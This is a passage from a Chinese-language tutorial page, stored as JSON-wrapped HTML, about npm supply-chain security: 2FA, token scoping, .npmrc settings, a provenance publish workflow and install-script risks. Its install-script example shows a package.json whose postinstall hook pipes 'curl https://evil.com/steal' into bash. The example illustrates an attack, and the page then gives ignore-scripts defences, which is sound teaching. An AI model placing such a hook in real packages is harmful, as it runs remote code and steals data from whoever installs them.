{"seq":2,"slug":"npm-security","title":"npm 安全","url":"/l-doc-books/h/frontend/frontend-security/supply-chain-security/npm-security","wordCount":576,"readingTime":3,"html":"<h1 id=\"npm-安全\">npm 安全</h1><h2 id=\"核心概念\">核心概念</h2><p>npm 是 JavaScript 生态系统的核心包管理器，也是全球最大的软件注册表。npm 的安全涉及账号保护、包发布安全、注册表配置和安装时行为控制等多个层面。由于 npm 生态系统的开放性，攻击者可以通过发布恶意包、劫持维护者账号或利用 install 脚本等方式进行供应链攻击。</p>\n<p>理解 npm 的安全机制并采取适当的防护措施，对于维护前端项目的完整性至关重要。</p>\n<pre class=\"mermaid\" data-diagram-type=\"graph\" data-source=\"graph TD&#10;    A[npm 安全] --&gt; B[账号安全]&#10;    A --&gt; C[包发布安全]&#10;    A --&gt; D[安装安全]&#10;    A --&gt; E[注册表安全]&#10;    B --&gt; B1[2FA 认证]&#10;    B --&gt; B2[Token 管理]&#10;    C --&gt; C1[发布权限]&#10;    C --&gt; C2[Provenance]&#10;    D --&gt; D1[install 脚本]&#10;    D --&gt; D2[lockfile 审查]&#10;    E --&gt; E1[私有注册表]&#10;    E --&gt; E2[Scope 配置]\">graph TD\n    A[npm 安全] --&gt; B[账号安全]\n    A --&gt; C[包发布安全]\n    A --&gt; D[安装安全]\n    A --&gt; E[注册表安全]\n    B --&gt; B1[2FA 认证]\n    B --&gt; B2[Token 管理]\n    C --&gt; C1[发布权限]\n    C --&gt; C2[Provenance]\n    D --&gt; D1[install 脚本]\n    D --&gt; D2[lockfile 审查]\n    E --&gt; E1[私有注册表]\n    E --&gt; E2[Scope 配置]</pre><table>\n<thead>\n<tr>\n<th>安全风险</th>\n<th>攻击场景</th>\n<th>影响范围</th>\n<th>防御手段</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>账号劫持</td>\n<td>密码泄露/社工</td>\n<td>所有使用该包的项目</td>\n<td>2FA + Token 限制</td>\n</tr>\n<tr>\n<td>恶意 install 脚本</td>\n<td>安装时执行恶意命令</td>\n<td>安装环境</td>\n<td>ignore-scripts</td>\n</tr>\n<tr>\n<td>Typosquatting</td>\n<td>注册相似名称的包</td>\n<td>误装的项目</td>\n<td>包名验证</td>\n</tr>\n<tr>\n<td>依赖混淆</td>\n<td>公共注册表抢注私有包名</td>\n<td>使用私有包的项目</td>\n<td>Scope + 注册表配置</td>\n</tr>\n<tr>\n<td>Token 泄露</td>\n<td>Token 写入代码或日志</td>\n<td>关联的 npm 账号</td>\n<td>环境变量 + .npmrc</td>\n</tr>\n</tbody></table>\n<h2 id=\"账号与-token-安全\">账号与 Token 安全</h2><p>npm 账号是包发布的入口，其安全性直接影响下游所有用户：</p>\n<div class=\"code-block-wrapper\" data-lang=\"bash\" data-code=\"npm profile enable-2fa auth-and-writes&#10;&#10;npm token list&#10;&#10;npm token create --read-only --cidr=192.168.1.0/24&#10;&#10;npm token revoke &lt;token-id&gt;\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> profile</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> enable-2fa</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> auth-and-writes</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> token</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> list</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> token</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> create</span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\"> --read-only</span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\"> --cidr=192.168.1.0/24</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> token</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> revoke</span><span style=\"color:#D73A49;--shiki-dark:#F97583\"> &#x3C;</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">token-i</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">d</span><span style=\"color:#D73A49;--shiki-dark:#F97583\">></span></span></code></pre></div><p><code>.npmrc</code> 安全配置：</p>\n<div class=\"code-block-wrapper\" data-lang=\"ini\" data-code=\"# 项目级 .npmrc（提交到版本控制）&#10;engine-strict=true&#10;save-exact=true&#10;ignore-scripts=true&#10;audit=true&#10;&#10;# 用户级 ~/.npmrc（不提交到版本控制）&#10;//registry.npmjs.org/:_authToken=${NPM_TOKEN}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span># 项目级 .npmrc（提交到版本控制）</span></span>\n<span class=\"line\"><span>engine-strict=true</span></span>\n<span class=\"line\"><span>save-exact=true</span></span>\n<span class=\"line\"><span>ignore-scripts=true</span></span>\n<span class=\"line\"><span>audit=true</span></span>\n<span class=\"line\"><span></span></span>\n<span class=\"line\"><span># 用户级 ~/.npmrc（不提交到版本控制）</span></span>\n<span class=\"line\"><span>//registry.npmjs.org/:_authToken=${NPM_TOKEN}</span></span></code></pre></div><div class=\"code-block-wrapper\" data-lang=\"typescript\" data-code=\"const npmSecurityBestPractices = {&#10;  account: {&#10;    enable2FA: true,&#10;    useGranularTokens: true,&#10;    regularlyRotateTokens: true,&#10;    monitorLoginActivity: true,&#10;  },&#10;  tokens: {&#10;    useReadOnlyForCI: true,&#10;    restrictByCIDR: true,&#10;    setExpiration: true,&#10;    neverCommitToRepo: true,&#10;  },&#10;};\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color:#D73A49;--shiki-dark:#F97583\">const</span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\"> npmSecurityBestPractices</span><span style=\"color:#D73A49;--shiki-dark:#F97583\"> =</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\"> {</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">  account: {</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    enable2FA: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    useGranularTokens: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    regularlyRotateTokens: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    monitorLoginActivity: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">  },</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">  tokens: {</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    useReadOnlyForCI: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    restrictByCIDR: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    setExpiration: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">    neverCommitToRepo: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">true</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">  },</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">};</span></span></code></pre></div><p>CI/CD 中安全使用 npm Token：</p>\n<div class=\"code-block-wrapper\" data-lang=\"yaml\" data-code=\"name: Publish&#10;on:&#10;  release:&#10;    types: [published]&#10;&#10;jobs:&#10;  publish:&#10;    runs-on: ubuntu-latest&#10;    permissions:&#10;      contents: read&#10;      id-token: write&#10;    steps:&#10;      - uses: actions/checkout@v4&#10;      - uses: actions/setup-node@v4&#10;        with:&#10;          node-version: 20&#10;          registry-url: &#39;https://registry.npmjs.org&#39;&#10;      - run: npm ci&#10;      - run: npm publish --provenance --access public&#10;        env:&#10;          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">name</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">Publish</span></span>\n<span class=\"line\"><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">on</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">  release</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">    types</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: [</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">published</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">]</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">jobs</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">  publish</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">    runs-on</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">ubuntu-latest</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">    permissions</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">      contents</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">read</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">      id-token</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">write</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">    steps</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">      - </span><span style=\"color:#22863A;--shiki-dark:#85E89D\">uses</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">actions/checkout@v4</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">      - </span><span style=\"color:#22863A;--shiki-dark:#85E89D\">uses</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">actions/setup-node@v4</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">        with</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">          node-version</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">20</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">          registry-url</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">'https://registry.npmjs.org'</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">      - </span><span style=\"color:#22863A;--shiki-dark:#85E89D\">run</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">npm ci</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">      - </span><span style=\"color:#22863A;--shiki-dark:#85E89D\">run</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">npm publish --provenance --access public</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">        env</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">:</span></span>\n<span class=\"line\"><span style=\"color:#22863A;--shiki-dark:#85E89D\">          NODE_AUTH_TOKEN</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">${{ secrets.NPM_TOKEN }}</span></span></code></pre></div><h2 id=\"install-脚本安全\">install 脚本安全</h2><p>npm 包的 install 脚本（preinstall/postinstall）是供应链攻击的主要载体：</p>\n<div class=\"code-block-wrapper\" data-lang=\"json\" data-code=\"{&#10;  &quot;scripts&quot;: {&#10;    &quot;preinstall&quot;: &quot;node malicious.js&quot;,&#10;    &quot;postinstall&quot;: &quot;curl https://evil.com/steal | bash&quot;,&#10;    &quot;install&quot;: &quot;node setup.js&quot;&#10;  }&#10;}\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">{</span></span>\n<span class=\"line\"><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">  \"scripts\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: {</span></span>\n<span class=\"line\"><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">    \"preinstall\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">\"node malicious.js\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">    \"postinstall\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">\"curl https://evil.com/steal | bash\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">,</span></span>\n<span class=\"line\"><span style=\"color:#005CC5;--shiki-dark:#79B8FF\">    \"install\"</span><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">: </span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\">\"node setup.js\"</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">  }</span></span>\n<span class=\"line\"><span style=\"color:#24292E;--shiki-dark:#E1E4E8\">}</span></span></code></pre></div><p>防御措施：</p>\n<div class=\"code-block-wrapper\" data-lang=\"bash\" data-code=\"npm install --ignore-scripts&#10;&#10;npm config set ignore-scripts true&#10;&#10;npm rebuild &lt;specific-package&gt;\"><pre class=\"shiki shiki-themes github-light github-dark\" style=\"background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> install</span><span style=\"color:#005CC5;--shiki-dark:#79B8FF\"> --ignore-scripts</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color:#6F42C1;--shiki-dark:#B392F0\">npm</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> config</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> set</span><span style=\"color:#032F62;--shiki-dark:#9ECBFF\"> ignore-scripts</span><span style=\"color:#005CC5;--shiki-dark:#